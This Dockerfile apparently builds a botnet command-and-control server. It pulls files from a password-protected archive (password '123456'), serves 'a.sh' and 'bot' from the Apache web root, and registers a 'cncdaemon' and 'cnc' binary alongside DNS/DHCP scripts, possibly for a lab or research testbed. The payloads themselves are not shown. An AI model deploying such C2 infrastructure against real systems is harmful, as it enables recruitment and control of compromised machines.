FROM ubuntu:latest

ARG DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y apt-transport-https

RUN apt-get install -q -y --no-install-recommends dialog debconf-utils apt-utils apt-file pciutils software-properties-common wget curl gnupg nano unzip p7zip-full libbz2-dev net-tools dnsutils ifupdown procps iputils-ping

RUN apt-get install -q -y apache2 telnet

WORKDIR /

RUN set -eux; \
    printf '#!/bin/sh\nexit 101\n' > /usr/sbin/policy-rc.d; chmod +x /usr/sbin/policy-rc.d; \
    apt-get update; \
    apt-get install -y --no-install-recommends telnet mysql-server mysql-client ca-certificates; \
    rm -f /usr/sbin/policy-rc.d; \
    rm -rf /var/lib/apt/lists/*; \
    mkdir -p /run/mysqld && chown mysql:mysql /run/mysqld

# Default all *future* MySQL accounts to mysql_native_password
RUN printf "[mysqld]\ndefault_authentication_plugin = mysql_native_password\n" \
    > /etc/mysql/mysql.conf.d/zz-native.cnf

COPY .conf /conf.7z

RUN 7z x conf.7z -p123456 && rm conf.7z

RUN mv a.sh bot /var/www/html/
RUN mv cncdaemon /etc/init.d/
RUN mv mysql-init /usr/local/bin/mysql-init

RUN chmod +x /etc/init.d/cncdaemon /usr/local/bin/mysql-init


RUN chmod +x /prep.sh /dns.py /dhcp.py /cnc /db.sql
RUN mv -t /home/ /prep.sh /dns.py /dhcp.py /cnc /db.sql

# CMD ["/bin/bash"]
CMD ["/home/prep.sh"]